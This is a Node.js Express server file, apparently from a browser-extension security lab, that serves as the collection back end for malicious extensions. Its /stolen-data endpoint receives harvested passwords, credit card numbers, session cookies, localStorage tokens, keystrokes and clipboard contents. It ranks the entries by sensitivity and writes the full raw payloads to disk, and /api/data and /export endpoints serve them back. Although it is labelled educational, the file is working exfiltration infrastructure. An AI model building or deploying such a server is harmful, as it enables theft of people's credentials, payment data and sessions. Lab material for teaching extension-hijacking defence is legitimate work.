#!/usr/bin/env node

/**
 * EXTENSION DATA COLLECTION SERVER
 *
 * This server receives and logs data collected by malicious browser extensions.
 * It demonstrates how attackers might set up collection infrastructure for
 * harvested data from compromised extensions.
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

const express = require('express')
const cors = require('cors')
const fs = require('fs').promises
const path = require('path')

const app = express()
// Use Cloud Run PORT environment variable, fallback to 3000 for local development
const PORT = process.env.PORT || 3000

// Middleware
app.use(cors())
app.use(express.json({ limit: '10mb' }))
app.use(express.raw({ type: 'application/x-www-form-urlencoded', limit: '10mb' }))

// Data storage
let collectedData = []
let stats = {
  totalSessions: 0,
  totalFields: 0,
  totalForms: 0,
  totalCookies: 0,
  startTime: Date.now()
}

/**
 * Data Collection Endpoint
 */
app.post('/stolen-data', async (req, res) => {
  try {
    const timestamp = new Date().toISOString()
    const clientIP = req.ip || req.connection.remoteAddress

    console.log(`\n[${timestamp}] Extension Data Received`)
    console.log('─'.repeat(60))
    console.log(`Client IP: ${clientIP}`)
    console.log(`User-Agent: ${req.get('User-Agent') || 'Unknown'}`)

    let payload = req.body

    // Handle different content types
    if (typeof payload === 'string') {
      try {
        payload = JSON.parse(payload)
      } catch (e) {
        console.log('Raw payload:', payload)
        payload = { raw: payload }
      }
    }

    // Process and analyze payload
    const analysis = analyzePayload(payload)

    // Store the data
    const dataEntry = {
      timestamp,
      clientIP,
      userAgent: req.get('User-Agent'),
      payload,
      analysis,
      id: generateDataId()
    }

    collectedData.push(dataEntry)
    updateStats(analysis)

    // Log summary
    console.log(`Session ID: ${payload.sessionId || 'Unknown'}`)
    console.log(`URL: ${payload.url || 'Unknown'}`)
    console.log(`Data Types: ${analysis.dataTypes.join(', ')}`)
    console.log(`Sensitive Fields: ${analysis.sensitiveFieldCount}`)
    console.log(`Risk Level: ${analysis.riskLevel}`)

    // Log sensitive data (for demonstration)
    if (analysis.sensitiveFingdings.length > 0) {
      console.log('\n🚨 SENSITIVE DATA DETECTED:')
      analysis.sensitiveFingdings.forEach(finding => {
        console.log(`  ${finding.type}: ${finding.description}`)
        if (finding.sample) {
          console.log(`  Sample: ${finding.sample}`)
        }
      })
    }

    // Save to file
    await saveDataToFile(dataEntry)

    console.log('─'.repeat(60))

    res.status(200).json({
      success: true,
      message: 'Data received',
      dataId: dataEntry.id,
      timestamp
    })
  } catch (error) {
    console.error('Error processing extension data:', error)
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    })
  }
})

/**
 * Analyze Payload for Sensitive Data
 */
function analyzePayload(payload) {
  const analysis = {
    dataTypes: [],
    sensitiveFieldCount: 0,
    sensitiveFingdings: [],
    riskLevel: 'low',
    formCount: 0,
    cookieCount: 0
  }

  if (!payload || !payload.data) {
    return analysis
  }

  // Analyze each data item
  payload.data.forEach(item => {
    if (!analysis.dataTypes.includes(item.type)) {
      analysis.dataTypes.push(item.type)
    }

    switch (item.type) {
      case 'form_submission':
        analysis.formCount++
        analyzeFormData(item.data, analysis)
        break

      case 'field_data':
        analyzeFieldData(item, analysis)
        break

      case 'cookies':
        analysis.cookieCount += item.data.cookies?.length || 0
        analyzeCookies(item.data.cookies, analysis)
        break

      case 'localStorage':
        analyzeLocalStorage(item.data.storage, analysis)
        break

      case 'keystrokes':
        analyzeKeystrokes(item.data, analysis)
        break

      case 'clipboard':
        analyzeClipboard(item.data, analysis)
        break
    }
  })

  // Determine risk level
  if (analysis.sensitiveFingdings.length >= 5) {
    analysis.riskLevel = 'critical'
  } else if (analysis.sensitiveFingdings.length >= 3) {
    analysis.riskLevel = 'high'
  } else if (analysis.sensitiveFingdings.length >= 1) {
    analysis.riskLevel = 'medium'
  }

  return analysis
}

/**
 * Analyze Form Data
 */
function analyzeFormData(formData, analysis) {
  if (!formData.fields) return

  formData.fields.forEach(field => {
    const fieldName = field.name.toLowerCase()
    const fieldValue = field.value

    if (isPasswordField(field)) {
      analysis.sensitiveFieldCount++
      analysis.sensitiveFingdings.push({
        type: 'Password',
        description: `Password field captured: ${field.name}`,
        sample: '*'.repeat(fieldValue.length)
      })
    }

    if (isCreditCardField(field)) {
      analysis.sensitiveFieldCount++
      analysis.sensitiveFingdings.push({
        type: 'Credit Card',
        description: `Credit card data captured: ${field.name}`,
        sample: maskCreditCard(fieldValue)
      })
    }

    if (isPIIField(field)) {
      analysis.sensitiveFieldCount++
      analysis.sensitiveFingdings.push({
        type: 'PII',
        description: `Personal information captured: ${field.name}`,
        sample: fieldValue.substring(0, 3) + '***'
      })
    }
  })
}

/**
 * Analyze Field Data
 */
function analyzeFieldData(item, analysis) {
  const field = {
    name: item.name,
    type: item.type,
    value: item.value
  }

  if (isPasswordField(field)) {
    analysis.sensitiveFieldCount++
    analysis.sensitiveFingdings.push({
      type: 'Real-time Password',
      description: `Password captured in real-time: ${field.name}`,
      sample: '*'.repeat(field.value.length)
    })
  }

  if (isCreditCardField(field)) {
    analysis.sensitiveFieldCount++
    analysis.sensitiveFingdings.push({
      type: 'Real-time Credit Card',
      description: `Credit card captured in real-time: ${field.name}`,
      sample: maskCreditCard(field.value)
    })
  }
}

/**
 * Analyze Cookies
 */
function analyzeCookies(cookies, analysis) {
  if (!cookies) return

  cookies.forEach(cookie => {
    const cookieName = cookie.name.toLowerCase()

    if (
      cookieName.includes('session') ||
      cookieName.includes('auth') ||
      cookieName.includes('token')
    ) {
      analysis.sensitiveFingdings.push({
        type: 'Session Cookie',
        description: `Authentication cookie captured: ${cookie.name}`,
        sample: cookie.value.substring(0, 10) + '***'
      })
    }
  })
}

/**
 * Analyze Local Storage
 */
function analyzeLocalStorage(storage, analysis) {
  if (!storage) return

  Object.keys(storage).forEach(key => {
    const keyName = key.toLowerCase()
    const value = storage[key]

    if (keyName.includes('token') || keyName.includes('auth') || keyName.includes('session')) {
      analysis.sensitiveFingdings.push({
        type: 'Local Storage Auth',
        description: `Authentication data in localStorage: ${key}`,
        sample: value.substring(0, 10) + '***'
      })
    }

    if (keyName.includes('card') || keyName.includes('payment')) {
      analysis.sensitiveFingdings.push({
        type: 'Stored Payment Data',
        description: `Payment data in localStorage: ${key}`,
        sample: '***'
      })
    }
  })
}

/**
 * Analyze Keystrokes
 */
function analyzeKeystrokes(data, analysis) {
  const sequence = data.sequence

  // Look for password-like patterns
  if (sequence.length > 8 && /[A-Za-z0-9!@#$%^&*]/.test(sequence)) {
    analysis.sensitiveFingdings.push({
      type: 'Keystroke Pattern',
      description: 'Potential password or sensitive input captured via keylogging',
      sample: sequence.substring(0, 3) + '***'
    })
  }

  // Look for credit card patterns
  const cardPattern = /\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}/
  if (cardPattern.test(sequence)) {
    analysis.sensitiveFingdings.push({
      type: 'Keystroke Credit Card',
      description: 'Credit card number detected in keystroke sequence',
      sample: '****-****-****-' + sequence.slice(-4)
    })
  }
}

/**
 * Analyze Clipboard
 */
function analyzeClipboard(data, analysis) {
  const content = data.content

  // Check for credit card patterns
  const cardPattern = /\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}/
  if (cardPattern.test(content)) {
    analysis.sensitiveFingdings.push({
      type: 'Clipboard Credit Card',
      description: 'Credit card number detected in clipboard data',
      sample: '****-****-****-' + content.slice(-4)
    })
  }

  // Check for email patterns
  const emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/
  if (emailPattern.test(content)) {
    analysis.sensitiveFingdings.push({
      type: 'Clipboard Email',
      description: 'Email address detected in clipboard data',
      sample: content.substring(0, 3) + '***@***'
    })
  }
}

/**
 * Field Type Detection Functions
 */
function isPasswordField(field) {
  return (
    field.type === 'password' ||
    field.name.toLowerCase().includes('password') ||
    field.name.toLowerCase().includes('pwd')
  )
}

function isCreditCardField(field) {
  const name = field.name.toLowerCase()
  return (
    name.includes('card') ||
    name.includes('credit') ||
    name.includes('cvv') ||
    name.includes('cvc') ||
    /\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}/.test(field.value)
  )
}

function isPIIField(field) {
  const name = field.name.toLowerCase()
  return (
    name.includes('ssn') ||
    name.includes('social') ||
    name.includes('tax') ||
    name.includes('license') ||
    name.includes('passport')
  )
}

/**
 * Utility Functions
 */
function maskCreditCard(cardNumber) {
  if (!cardNumber) return '***'
  const cleaned = cardNumber.replace(/\D/g, '')
  if (cleaned.length >= 4) {
    return '****-****-****-' + cleaned.slice(-4)
  }
  return '***'
}

function generateDataId() {
  return 'data_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
}

function updateStats(analysis) {
  stats.totalSessions++
  stats.totalFields += analysis.sensitiveFieldCount
  stats.totalForms += analysis.formCount
  stats.totalCookies += analysis.cookieCount
}

/**
 * Save Data to File
 */
async function saveDataToFile(dataEntry) {
  try {
    const stolenDataDir = path.join(__dirname, 'stolen-data')
    await fs.mkdir(stolenDataDir, { recursive: true })

    const today = new Date().toISOString().split('T')[0]
    const logFile = path.join(stolenDataDir, `extension-data-${today}.log`)

    const logEntry = {
      timestamp: dataEntry.timestamp,
      id: dataEntry.id,
      clientIP: dataEntry.clientIP,
      userAgent: dataEntry.userAgent,
      url: dataEntry.payload.url,
      sessionId: dataEntry.payload.sessionId,
      analysis: dataEntry.analysis,
      dataTypes: dataEntry.analysis.dataTypes,
      riskLevel: dataEntry.analysis.riskLevel,
      sensitiveCount: dataEntry.analysis.sensitiveFieldCount
    }

    await fs.appendFile(logFile, JSON.stringify(logEntry) + '\n')

    // Also save full data
    const dataFile = path.join(stolenDataDir, `full-data-${today}.json`)
    let existingData = []

    try {
      const existing = await fs.readFile(dataFile, 'utf8')
      existingData = JSON.parse(existing)
    } catch (e) {
      // File doesn't exist yet
    }

    existingData.push(dataEntry)
    await fs.writeFile(dataFile, JSON.stringify(existingData, null, 2))
  } catch (error) {
    console.error('Error saving data to file:', error)
  }
}

/**
 * API Endpoint - Get all collected data
 */
app.get('/api/data', (req, res) => {
  try {
    res.json({
      success: true,
      count: collectedData.length,
      data: collectedData,
      stats: stats
    })
  } catch (error) {
    console.error('Error retrieving collected data:', error)
    res.status(500).json({
      success: false,
      error: error.message
    })
  }
})

/**
 * Status Dashboard Endpoint
 */
app.get('/status', (req, res) => {
  const uptime = Date.now() - stats.startTime
  const uptimeHours = Math.floor(uptime / (1000 * 60 * 60))
  const uptimeMinutes = Math.floor((uptime % (1000 * 60 * 60)) / (1000 * 60))

  res.json({
    server: 'Extension Data Collection Server',
    status: 'active',
    uptime: `${uptimeHours}h ${uptimeMinutes}m`,
    stats: {
      ...stats,
      recentSessions: collectedData.slice(-10).map(entry => ({
        id: entry.id,
        timestamp: entry.timestamp,
        url: entry.payload.url,
        riskLevel: entry.analysis.riskLevel,
        dataTypes: entry.analysis.dataTypes
      }))
    }
  })
})

/**
 * Data Export Endpoint
 */
app.get('/export/:date?', async (req, res) => {
  try {
    let date = req.params.date || new Date().toISOString().split('T')[0]
    
    // Security: Validate date format to prevent path traversal
    // Only allow ISO date format: YYYY-MM-DD
    const dateRegex = /^\d{4}-\d{2}-\d{2}$/
    if (!dateRegex.test(date) || date.includes('..') || date.includes('/') || date.includes('\\')) {
      return res.status(400).json({ error: 'Invalid date format. Use YYYY-MM-DD' })
    }
    
    // Use path.basename to strip any directory separators
    const safeDate = path.basename(date)
    const stolenDataDir = path.join(__dirname, 'stolen-data')
    const dataFile = path.join(stolenDataDir, `full-data-${safeDate}.json`)
    
    // Verify the resolved path is within stolenDataDir (prevent path traversal)
    const resolvedPath = path.resolve(dataFile)
    const resolvedStolenDataDir = path.resolve(stolenDataDir)
    if (!resolvedPath.startsWith(resolvedStolenDataDir)) {
      return res.status(403).json({ error: 'Access denied' })
    }

    const data = await fs.readFile(dataFile, 'utf8')
    const jsonData = JSON.parse(data)

    res.setHeader('Content-Disposition', `attachment; filename="extension-data-${safeDate}.json"`)
    res.setHeader('Content-Type', 'application/json')
    res.send(JSON.stringify(jsonData, null, 2))
  } catch (error) {
    res.status(404).json({
      error: 'Data not found for the specified date',
      date: req.params.date || 'today'
    })
  }
})

/**
 * Health Check Endpoint
 */
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    version: '1.0.0'
  })
})

/**
 * Dashboard endpoint - serves the main dashboard
 */
app.get('/', async (req, res) => {
  try {
    const dashboardPath = path.join(__dirname, 'dashboard.html')
    const dashboard = await fs.readFile(dashboardPath, 'utf8')
    res.send(dashboard)
  } catch (error) {
    console.error('[Extension Server] Failed to serve dashboard:', error)
    res.status(500).send('Dashboard not available')
  }
})

// Also serve dashboard at /stolen-data for nginx proxy (matching Lab 2)
app.get('/stolen-data', async (req, res) => {
  try {
    const dashboardPath = path.join(__dirname, 'dashboard.html')
    const dashboard = await fs.readFile(dashboardPath, 'utf8')
    res.send(dashboard)
  } catch (error) {
    console.error('[Extension Server] Failed to serve dashboard:', error)
    res.status(500).send('Dashboard not available')
  }
})

/**
 * Start Server
 */
app.listen(PORT, () => {
  console.log('\n🚀 Extension Data Collection Server Started')
  console.log('═'.repeat(60))
  console.log(`📡 Server running on: http://localhost:${PORT}`)
  console.log(`📊 Status dashboard: http://localhost:${PORT}/status`)
  console.log(`💾 Data endpoint: POST http://localhost:${PORT}/stolen-data`)
  console.log(`📁 Export data: GET http://localhost:${PORT}/export/YYYY-MM-DD`)
  console.log('═'.repeat(60))
  console.log('⚠️  FOR EDUCATIONAL PURPOSES ONLY')
  console.log('   This server simulates malicious data collection infrastructure')
  console.log('   to demonstrate browser extension hijacking attacks.\n')
})

/**
 * Graceful Shutdown
 */
process.on('SIGINT', () => {
  console.log('\n📊 Final Statistics:')
  console.log('─'.repeat(40))
  console.log(`Total Sessions: ${stats.totalSessions}`)
  console.log(`Sensitive Fields: ${stats.totalFields}`)
  console.log(`Forms Processed: ${stats.totalForms}`)
  console.log(`Cookies Harvested: ${stats.totalCookies}`)
  console.log('─'.repeat(40))
  console.log('🛑 Extension Data Collection Server Stopped\n')
  process.exit(0)
})

module.exports = app
